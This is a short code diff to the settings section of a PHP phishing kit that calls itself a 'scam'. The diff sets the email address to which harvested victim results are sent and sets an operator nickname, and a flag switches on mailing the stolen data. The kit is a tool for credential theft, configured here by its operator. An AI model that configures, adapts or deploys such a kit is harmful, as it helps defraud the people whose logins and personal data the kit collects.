@@ -19,12 +19,12 @@
          ############# [+] EMAIL INFORMATION [+] ##############
         ########################################################
 
-     	$yours = "yourmail"; // Edit this to your email 
+     	$yours = "bentaherdaly123@gmail.com"; // Edit this to your email 
 
 
 	// ================================= //
 
-	$scamname = "swagkarna"; // *Change |shadow| to any name you want |Your Nick Name|
+	$scamname = "p1eceofshit"; // *Change |shadow| to any name you want |Your Nick Name|
 
 	$sendtoemail = "yes";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
 	
